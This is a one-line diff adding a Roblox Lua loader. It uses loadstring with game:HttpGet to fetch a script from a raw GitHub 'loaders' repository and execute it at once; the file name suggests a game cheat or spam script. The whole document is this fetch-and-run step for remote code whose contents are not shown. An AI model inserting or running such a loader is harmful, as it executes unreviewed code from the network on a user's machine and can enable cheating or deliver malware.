@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/MountainTrackLose/loaders/main/loaders/huntress-nightmare-spam3-34luqducl6te6k.lua"))()
